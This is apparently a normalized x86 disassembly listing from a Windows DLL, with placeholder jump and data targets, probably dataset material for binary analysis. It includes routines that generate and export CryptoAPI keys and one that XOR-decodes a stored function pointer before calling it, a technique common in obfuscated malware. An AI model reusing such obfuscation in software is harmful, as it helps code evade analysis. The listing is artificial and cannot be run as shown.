push ecx
push ecx
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x10 ]
push edi
push esi
mov [ ebp - 0x4 ] eax
call sub_10041241
or edi 0xffffffff
pop ecx
cmp eax edi
jne r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x4 ]
push ecx
push [ ebp - 0x8 ]
push eax
call [ SetFilePointer@IAT ]
mov [ ebp - 0x8 ] eax
cmp eax edi
jne r-xdata
call sub_1005b670
mov [ eax ] 0x9
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfd
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call [ GetLastError@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
leave
retn
push eax
call sub_1005bae3
pop ecx
jmp r-xdata
mov eax edi
mov edx edi
jmp r-xdata
sub_10049fbf
push ebp
mov ebp esp
push ecx
push ecx
push edi
xor edi edi
push edi
push 0x1
push edi
push edi
lea eax [ ebp - 0x8 ]
push eax
mov [ ebp - 0x8 ] edi
mov [ ebp - 0x4 ] edi
call [ CryptAcquireContextW@IAT ]
test eax eax
jne r-xdata
push ebx
push esi
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0x18 ]
or eax 0x80
shl eax 0x10
push eax
push 0xa400
push [ ebp - 0x8 ]
call [ CryptGenKey@IAT ]
test eax eax
jne r-xdata
inc eax
mov ebx [ ebp + 0xc ]
mov esi [ CryptExportKey@IAT ]
push ebx
push edi
push edi
push 0x6
push edi
push [ ebp - 0x4 ]
call esi
test eax eax
jne r-xdata
push 0x2
push [ ebx ]
mov ebx [ GetProcessHeap@IAT ]
push 0x8
call ebx
push eax
call [ HeapAlloc@IAT ]
mov ecx [ ebp + 0x8 ]
mov [ ecx ] eax
cmp eax edi
jne r-xdata
push [ ebp - 0x4 ]
call [ CryptDestroyKey@IAT ]
push 0x3
jmp r-xdata
pop edi
leave
retn 0x14
push [ ebp + 0xc ]
push eax
push edi
push 0x6
push edi
push [ ebp - 0x4 ]
call esi
test eax eax
jne r-xdata
push [ ebp - 0x4 ]
call [ CryptDestroyKey@IAT ]
push 0x4
jmp r-xdata
pop esi
push [ ebp + 0x14 ]
push edi
push edi
push 0x7
push edi
push [ ebp - 0x4 ]
call esi
test eax eax
jne r-xdata
push [ ebp - 0x4 ]
call [ CryptDestroyKey@IAT ]
push 0x5
jmp r-xdata
mov eax [ ebp + 0x14 ]
push [ eax ]
push 0x8
call ebx
push eax
call [ HeapAlloc@IAT ]
mov ecx [ ebp + 0x10 ]
mov [ ecx ] eax
cmp eax edi
jne r-xdata
push [ ebp - 0x4 ]
call [ CryptDestroyKey@IAT ]
push 0x6
jmp r-xdata
push [ ebp + 0x14 ]
push eax
push edi
push 0x6
push edi
push [ ebp - 0x4 ]
call esi
push [ ebp - 0x4 ]
test eax eax
jne r-xdata
push [ ebp - 0x4 ]
call [ CryptDestroyKey@IAT ]
push 0x7
jmp r-xdata
call [ CryptDestroyKey@IAT ]
xor esi esi
jmp r-xdata
call [ CryptDestroyKey@IAT ]
push 0x8
jmp r-xdata
push edi
push [ ebp - 0x8 ]
call [ CryptReleaseContext@IAT ]
mov eax esi
pop esi
pop ebx
jmp r-xdata
sub_1004a101
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov eax [ esi + 0x10 ]
push edi
mov edi [ ebp + 0x8 ]
cmp eax edi
jae r-xdata
mov ebx [ ebp + 0xc ]
or ecx 0xffffffff
sub ecx eax
cmp ecx ebx
ja r-xdata
push r--data
call sub_100651be
test ebx ebx
je r-xdata
push r--data
call sub_10030594
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
add eax ebx
push 0x0
push eax
mov ecx esi
mov [ ebp + 0x8 ] eax
call sub_10068c70
test al al
je r-xdata
mov eax [ esi + 0x14 ]
cmp eax 0x8
jb r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
cmp eax 0x8
jb r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
mov edx [ esi + 0x10 ]
sub edx edi
add edx edx
push edx
lea ecx [ ecx + edi * 2 ]
push ecx
lea ecx [ edi + ebx ]
lea eax [ eax + ecx * 2 ]
push eax
call sub_1007ec40
add esp 0xc
push [ ebp + 0x10 ]
mov ecx esi
push ebx
push edi
call sub_1006de60
cmp [ esi + 0x14 ] 0x8
mov eax [ ebp + 0x8 ]
mov [ esi + 0x10 ] eax
jb r-xdata
xor edx edx
mov [ ecx + eax * 2 ] dx
sub_1004a1ad
mov edi edi
push esi
push edi
mov esi ecx
call sub_1001e997
mov edi eax
test edi edi
je r-xdata
mov esi [ esi + 0xc ]
mov eax esi
test esi esi
jne r-xdata
lea ecx [ esi + 0xc ]
push edi
call sub_10024880
push edi
call sub_1001b2d2
pop ecx
pop edi
pop esi
retn
mov eax r--data
sub_1004a1df
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
test al 0x83
je r-xdata
pop esi
pop ebp
retn
test al 0x8
je r-xdata
push [ esi + 0x8 ]
call sub_1001b2d2
and [ esi + 0xc ] 0xfffffbf7
xor eax eax
pop ecx
mov [ esi ] eax
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] eax
sub_1004a210
push esi
mov esi ecx
mov eax [ esi + 0x1c ]
mov [ esi ] r--data
test eax eax
je r-xdata
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov [ esi + 0xc ] 0x0
mov [ esi + 0x10 ] 0x0
mov [ esi + 0x14 ] 0x0
pop esi
retn
push eax
call sub_1000a86e
add esp 0x4
sub_1004a260
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x4 ]
xor eax eax
push esi
test edx edx
je r-xdata
or eax 0xffffffff
mov ecx [ ecx ]
mov esi [ ebp + 0xc ]
pop esi
pop ebp
retn
inc eax
add ecx 0x4
cmp eax edx
jb r-xdata
cmp [ ecx ] esi
je r-xdata
sub_1004a290
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_10031020
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1000a86e
add esp 0x4
sub_1004a2b1
push 0x14
mov eax sub_10085df6
call sub_10026266
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_1000c927
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_1006ef60
mov ecx [ ebp + 0x8 ]
push eax
call sub_1005eec0
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10003c9c
mov eax edi
call sub_10008d33
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10015788
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10042890
push edi
call sub_10008715
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100661c2
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10055e2a
sub_1004a34e
push 0x14
mov eax sub_10085df6
call sub_10026266
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_1000c927
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_1006ef60
mov ecx [ ebp + 0x8 ]
push eax
call sub_1005eec0
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10003c9c
mov eax edi
call sub_10008d33
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10001098
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10042890
push edi
call sub_10008715
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100661c2
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10055e2a
sub_1004a3f0
push ebp
mov ebp esp
sub esp 0x41c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0x10 ]
push esi
mov esi ecx
mov [ ebp - 0x41c ] edx
test edi edi
je r-xdata
mov ecx [ ebp - 0x4 ]
pop esi
xor ecx ebp
mov eax 0x1
pop ebx
call sub_10032529
mov esp ebp
pop ebp
retn
test edx edx
je r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
test ebx ebx
je r-xdata
test esi esi
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
test [ ebp + 0xc ] 0x4
jne r-xdata
pop esi
mov eax 0x2
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
push eax
mov ecx edi
call sub_10051570
add esp 0x4
test eax eax
je r-xdata
pop esi
mov eax 0x3
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov ecx [ rw-data ]
push 0x104
lea eax [ ebp - 0x20c ]
push eax
push ecx
call [ GetModuleFileNameW@IAT ]
test eax eax
jne r-xdata
pop esi
mov eax 0x4
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x20c ]
push edx
call [ PathRemoveFileSpecW@IAT ]
lea eax [ ebp - 0x20c ]
push eax
call [ PathAddBackslashW@IAT ]
mov ecx [ rw-data ]
cmp [ ecx + 0xd54 ] 0x0
mov [ ebp - 0x418 ] esi
jne r-xdata
pop esi
mov eax 0x5
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x414 ]
lea esi [ ebp - 0x20c ]
mov ecx eax
xor ebx ebx
mov edx 0x104
sub esi ecx
mov [ ebp - 0x418 ] ebx
test edx edx
jne r-xdata
movzx ecx [ esi + eax ]
test cx cx
je r-xdata
xor edx edx
mov [ eax ] dx
test ebx ebx
je r-xdata
sub eax 0x2
mov ebx 0x8007007a
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
mov eax [ ebp - 0x418 ]
push eax
mov esi 0x104
lea ebx [ ebp - 0x414 ]
call sub_10050c60
test eax eax
je r-xdata
pop esi
lea eax [ edx + 0x6 ]
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
lea ecx [ edx + 0x7ffffefa ]
test ecx ecx
je r-xdata
jmp r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx [ ebp - 0x41c ]
lea edx [ ebp - 0x414 ]
push edx
mov edx edi
call sub_10015330
add esp 0x8
neg eax
sbb eax eax
pop esi
and eax 0x8
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
pop esi
mov eax 0x7
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
sub_1004a5e0
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
sub esp 0xc
xor eax eax
test ecx ecx
je r-xdata
mov esp ebp
pop ebp
retn 0x4
cmp ecx 0x7fffffff
ja r-xdata
lea ecx [ ebp + 0x8 ]
push ecx
lea ecx [ ebp - 0xc ]
mov [ ebp + 0x8 ] 0x0
call sub_10032538
push r--data
lea edx [ ebp - 0xc ]
push edx
mov [ ebp - 0xc ] r--data
call sub_10055e2a
lea eax [ ecx + ecx ]
push eax
call sub_1002e3ac
add esp 0x4
test eax eax
jne r-xdata
sub_1004a640
push ebp
mov ebp esp
push 0xffffffff
push sub_10086ee1
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi [ ebp + 0xc ]
mov edi ecx
xor ebx ebx
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] ebx
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x4 ] 0x1
cmp esi ebx
je r-xdata
add esi 0x24
mov [ ebp - 0x4 ] bl
mov [ ebp + 0xc ] esi
add edi 0x24
jmp r-xdata
push 0xffffffff
push ebx
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] ebx
push edi
mov ecx esi
mov [ esi ] ax
call sub_1002d970
mov ecx [ edi + 0x1c ]
mov [ esi + 0x1c ] ecx
mov edx [ edi + 0x20 ]
mov [ esi + 0x20 ] edx
cmp edi [ ebp + 0x8 ]
je r-xdata
sub_1004a6bc
mov esi [ ebp - 0x14 ]
mov edi [ ebp + 0xc ]
cmp esi edi
je r-xdata
xor ebx ebx
push ebx
push ebx
call sub_10055e2a
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_100603e0
add esi 0x24
cmp esi edi
jne r-xdata
sub_1004a6ef
mov edi edi
push ebp
mov ebp esp
sub esp 0x54
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x1c ]
push ebx
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x44 ] 0x0
and [ ebp - 0x48 ] 0x0
push esi
mov esi [ ebp + 0x20 ]
push edi
mov edi [ ebp + 0x8 ]
lea edx [ ebp - 0x44 ]
push edx
lea edx [ ebp - 0x48 ]
push edx
push eax
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x40 ]
push eax
push ecx
call sub_10020869
add esp 0x18
push eax
lea eax [ ebp - 0x4c ]
push eax
lea eax [ ebp - 0x40 ]
push eax
call sub_1001f911
fstp [ ebp - 0x54 ]
mov eax [ ebp - 0x48 ]
add esp 0x10
test eax eax
je r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1006995b
test al al
je r-xdata
fld [ ebp - 0x54 ]
shl eax 0x2
push eax
push ecx
push ecx
fstp [ esp ]
call sub_1002262f
fstp [ ebp - 0x54 ]
add esp 0xc
lea eax [ ebp - 0x40 ]
cmp [ ebp - 0x4c ] eax
je r-xdata
or [ esi ] 0x1
or [ esi ] 0x2
cmp [ ebp - 0x44 ] 0x0
jne r-xdata
fld [ ebp - 0x54 ]
fstp [ ebx ]
jmp r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ ebp - 0x4 ]
mov [ edi ] eax
mov eax [ ebp + 0x10 ]
mov [ edi + 0x4 ] eax
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10032529
leave
retn 0x20
sub_1004a7c0
push ebp
mov ebp esp
sub esp 0x74
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov [ ebp - 0x70 ] eax
mov eax [ eax + 0x1c ]
lea esi [ ebp - 0x5c ]
push esi
xor ebx ebx
mov edi edx
mov [ ebp - 0x5c ] ebx
mov edx [ eax ]
push ecx
push eax
mov eax [ edx + 0xdc ]
call eax
test eax eax
jns r-xdata
mov eax [ ebp - 0x5c ]
lea edx [ ebp - 0x60 ]
mov [ ebp - 0x60 ] ebx
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x20 ]
call eax
mov eax [ ebp - 0x60 ]
cmp eax ebx
jne r-xdata
lea eax [ ebx + 0x1 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn 0x8
xor ecx ecx
mov [ ebp - 0x6c ] ecx
cmp eax ebx
jle r-xdata
lea edx [ ebp - 0x30 ]
mov eax 0x1b
call sub_1002f620
mov eax 0x2
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp - 0x5c ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
xor eax eax
pop ebx
call sub_10032529
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp - 0x5c ]
lea esi [ ebp - 0x64 ]
push esi
mov [ ebp - 0x64 ] ebx
mov edx [ eax ]
push ecx
push eax
mov eax [ edx + 0x1c ]
call eax
mov ecx [ ebp - 0x64 ]
cmp ecx ebx
je r-xdata
lea edx [ ebp - 0x34 ]
mov eax 0x121
mov edx [ ebp + 0xc ]
push edx
mov edx [ ebp - 0x70 ]
lea eax [ ebp - 0x68 ]
push eax
push edx
mov [ ebp - 0x68 ] ebx
call sub_10047b90
mov esi [ ebp - 0x68 ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x6c ]
inc ecx
mov [ ebp - 0x6c ] ecx
cmp ecx [ ebp - 0x60 ]
jl r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
push esi
call sub_1003f2d0
cmp esi ebx
je r-xdata
cmp esi ebx
je r-xdata
mov eax [ ebp - 0x64 ]
cmp eax ebx
je r-xdata
push esi
call sub_100492c0
push esi
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
jmp r-xdata
lea edx [ ebp - 0x58 ]
mov eax 0x41
jmp r-xdata
push esi
call sub_100492c0
push esi
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
call sub_1002f620
sub_1004a920
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push esi
mov esi ecx
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] ax
mov eax edx
push edi
lea edi [ eax + 0x2 ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edi
sar eax 0x1
push eax
push edx
mov ecx esi
call sub_10034100
pop edi
mov eax esi
pop esi
pop ebp
retn 0x4
sub_1004a962
mov edi edi
push ebp
mov ebp esp
sub esp 0x30
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x14 ]
push ebx
mov ebx [ ebp + 0x10 ]
push esi
mov [ ebp - 0x24 ] eax
push edi
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_10013f1b
pop ecx
pop ecx
lea eax [ ebp - 0x20 ]
push eax
push 0x0
push 0x11
sub esp 0xc
lea esi [ ebp - 0x30 ]
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
call sub_10045df7
mov esi [ ebp - 0x24 ]
mov [ ebx + 0x8 ] eax
movsx eax [ ebp - 0x1e ]
mov [ ebx ] eax
movsx eax [ ebp - 0x20 ]
mov [ ebx + 0x4 ] eax
lea eax [ ebp - 0x1c ]
push eax
push [ ebp + 0x18 ]
push esi
call sub_10042442
add esp 0x24
test eax eax
jne r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_1005aa2b
int3
mov ecx [ ebp - 0x4 ]
pop edi
mov [ ebx + 0xc ] esi
pop esi
mov eax ebx
xor ecx ebp
pop ebx
call sub_10032529
leave
retn
sub_1004a9f0
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
xor eax eax
jmp r-xdata
cmp ecx [ ebp + 0xc ]
jne r-xdata
movzx edx [ ecx ]
rol eax 0x8
add eax edx
add ecx 0x2
pop ebp
retn 0x8
sub_1004aa10
push 0x14
mov eax sub_10085df6
call sub_10026266
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_1000c927
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_1006ef60
mov ecx [ ebp + 0x8 ]
push eax
call sub_1005eec0
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10003c9c
mov eax edi
call sub_10008d33
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10042511
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10042890
push edi
call sub_10008715
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100661c2
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10055e2a
sub_1004aac0
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov eax [ esi + 0x4c ]
xor ebx ebx
push edi
mov edi 0x1
cmp eax ebx
je r-xdata
mov edx [ esi ]
mov eax [ edx + 0x8 ]
mov ecx esi
call eax
mov eax [ esi + 0x90 ]
cmp eax ebx
je r-xdata
push ebx
push eax
call [ TerminateThread@IAT ]
mov ecx [ esi + 0x4c ]
mov edi eax
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
mov al 0x38
xor [ ebp - 0x4 ] al
xor [ ebp - 0x3 ] al
xor [ ebp - 0x2 ] al
xor [ ebp - 0x1 ] al
push ecx
call [ ebp - 0x4 ]
mov [ esi + 0x4c ] ebx
mov eax edi
pop edi
mov [ esi + 0x94 ] ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push eax
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov [ esi + 0x90 ] ebx
sub_1004ab38
mov edi edi
push esi
push edi
mov esi ecx
call sub_100068fb
mov edi eax
test edi edi
je r-xdata
mov esi [ esi + 0x4 ]
mov eax esi
test esi esi
jne r-xdata
lea ecx [ esi + 0x4 ]
push edi
call sub_10024880
push edi
call sub_1001b2d2
pop ecx
pop edi
pop esi
retn
mov eax r--data
sub_1004ab70
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0xc ]
mov eax edi
lea edx [ eax + 0x1 ]
lea ecx [ ecx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx ]
sub eax edx
mov edx [ ecx + 0x8 ]
inc eax
push eax
mov eax [ ecx ]
push edx
call eax
mov esi eax
add esp 0x8
mov ecx edi
sub esi edi
mov dl [ ecx ]
mov [ esi + ecx ] dl
inc ecx
test dl dl
jne r-xdata
pop edi
pop esi
pop ebp
retn
sub_1004abb0
push ebp
mov ebp esp
sub esp 0x8
push esi
mov esi ecx
cmp [ esi + 0x8 ] 0x0
mov eax [ esi + 0x4 ]
push edi
mov edi [ ebp + 0x10 ]
jne r-xdata
push ebx
mov ebx [ ebp + 0xc ]
cmp ebx [ eax ]
jne r-xdata
push edi
mov edi [ ebp + 0x8 ]
push eax
push 0x1
push edi
call sub_100445b0
mov eax edi
pop edi
pop esi
mov esp ebp
pop ebp
retn 0xc
cmp ebx eax
jne r-xdata
mov ecx [ edi + 0xc ]
cmp ecx [ ebx + 0xc ]
jae r-xdata
mov eax [ edi + 0xc ]
cmp eax [ ebx + 0xc ]
jae r-xdata
mov eax [ eax + 0x8 ]
mov edx [ eax + 0xc ]
cmp edx [ edi + 0xc ]
jae r-xdata
push 0x0
push edi
lea eax [ ebp - 0x8 ]
push eax
mov ecx esi
call sub_100410b0
mov ecx [ eax ]
mov eax [ ebp + 0x8 ]
pop ebx
pop edi
mov [ eax ] ecx
pop esi
mov esp ebp
pop ebp
retn 0xc
push edi
mov edi [ ebp + 0x8 ]
push ebx
push 0x1
push edi
mov ecx esi
call sub_100445b0
pop ebx
mov eax edi
pop edi
pop esi
mov esp ebp
pop ebp
retn 0xc
mov eax [ edi + 0xc ]
cmp [ ebx + 0xc ] eax
jae r-xdata
lea ecx [ ebp + 0x10 ]
mov [ ebp + 0x10 ] ebx
call sub_10040d60
mov eax [ ebp + 0x10 ]
mov ecx [ edi + 0xc ]
cmp [ eax + 0xc ] ecx
jae r-xdata
push edi
mov edi [ ebp + 0x8 ]
push eax
push 0x0
push edi
call sub_100445b0
pop ebx
mov eax edi
pop edi
pop esi
mov esp ebp
pop ebp
retn 0xc
lea ecx [ ebp + 0x10 ]
mov [ ebp + 0x10 ] ebx
call sub_10005aa0
mov eax [ ebp + 0x10 ]
cmp eax [ esi + 0x4 ]
je r-xdata
mov ecx [ eax + 0x8 ]
cmp [ ecx + 0x15 ] 0x0
push edi
mov edi [ ebp + 0x8 ]
mov ecx esi
je r-xdata
mov edx [ ebx + 0x8 ]
cmp [ edx + 0x15 ] 0x0
push edi
mov edi [ ebp + 0x8 ]
mov ecx esi
je r-xdata
mov ecx [ edi + 0xc ]
cmp ecx [ eax + 0xc ]
jae r-xdata
push ebx
push 0x1
push edi
call sub_100445b0
pop ebx
mov eax edi
pop edi
pop esi
mov esp ebp
pop ebp
retn 0xc
push eax
push 0x0
push edi
call sub_100445b0
pop ebx
mov eax edi
pop edi
pop esi
mov esp ebp
pop ebp
retn 0xc
push eax
push 0x1
push edi
call sub_100445b0
pop ebx
mov eax edi
pop edi
pop esi
mov esp ebp
pop ebp
retn 0xc
push ebx
push 0x0
push edi
call sub_100445b0
pop ebx
mov eax edi
pop edi
pop esi
mov esp ebp
pop ebp
retn 0xc
sub_1004ad03
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1005eb5c
add esp 0x18
pop ebp
retn
sub_1004ad30
push ebp
mov ebp esp
push ecx
mov edx [ ecx + 0x4 ]
mov eax [ edx + 0x4 ]
cmp [ eax + 0x15 ] 0x0
push edi
mov edi [ ebp + 0xc ]
jne r-xdata
mov eax [ ecx + 0x4 ]
mov [ ebp + 0xc ] edx
cmp edx eax
je r-xdata
push esi
mov esi [ edi ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x4 ]
mov edx [ eax ]
mov eax [ ebp + 0x8 ]
mov [ eax ] edx
pop edi
mov esp ebp
pop ebp
retn 0x8
mov ecx [ edi ]
cmp ecx [ edx + 0xc ]
jb r-xdata
mov edx eax
mov eax [ eax ]
mov eax [ eax + 0x8 ]
jmp r-xdata
lea eax [ ebp + 0xc ]
mov edx [ eax ]
mov eax [ ebp + 0x8 ]
mov [ eax ] edx
pop edi
mov esp ebp
pop ebp
retn 0x8
cmp [ eax + 0xc ] esi
jae r-xdata
pop esi
cmp [ eax + 0x15 ] 0x0
je r-xdata
sub_1004ad92
push 0x64
mov eax sub_10085623
call sub_10047689
mov eax [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0x10 ]
mov [ ebp - 0x64 ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x5c ] eax
mov eax [ ebp + 0x1c ]
push eax
call sub_10064f10
mov ebx eax
pop ecx
lea eax [ ebp - 0x48 ]
push eax
mov ecx ebx
call sub_10069c00
xor eax eax
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x38 ] eax
je r-xdata
add edi 0x8
push edi
push 0x0
push 0x30
mov [ ebp - 0x68 ] eax
mov [ ebp - 0x60 ] edi
call sub_10030ff0
add esp 0xc
push [ ebp - 0x5c ]
movzx ebx ax
mov eax [ ebp - 0x64 ]
mov ecx esi
mov [ ebp - 0x54 ] eax
call sub_1002839c
test al al
jne r-xdata
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x8 ]
movzx eax ax
mov eax [ ebp + 0x18 ]
and eax 0xe00
cmp eax 0x400
jne r-xdata
cmp [ esi + 0x4 ] al
jne r-xdata
cmp eax 0x800
jne r-xdata
mov [ ebp - 0x50 ] 0x8
jmp r-xdata
push [ ebp - 0x60 ]
movzx edi [ esi + 0x6 ]
push 0x0
push 0x2b
call sub_10030ff0
add esp 0xc
cmp di ax
jne r-xdata
mov ecx esi
call sub_100255aa
neg eax
sbb eax eax
and eax 0xa
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x50 ] 0x10
jmp r-xdata
push [ ebp - 0x5c ]
mov ecx esi
mov [ ebp - 0x58 ] 0x0
mov [ ebp - 0x49 ] 0x0
call sub_1002839c
test al al
jne r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x64 ]
mov [ eax ] 0x2b
jmp r-xdata
xor ebx ebx
cmp [ ebp - 0x50 ] ebx
je r-xdata
cmp [ esi + 0x4 ] al
jne r-xdata
push [ ebp - 0x60 ]
movzx edi [ esi + 0x6 ]
push 0x0
push 0x2d
call sub_10030ff0
add esp 0xc
cmp di ax
jne r-xdata
mov ecx esi
call sub_100255aa
inc eax
mov ecx esi
mov [ ebp - 0x54 ] eax
call sub_1000eff4
mov [ ebp - 0x6c ] 0xa
cmp [ ebp - 0x50 ] 0xa
je r-xdata
movzx eax [ esi + 0x6 ]
cmp ax bx
jne r-xdata
mov ecx esi
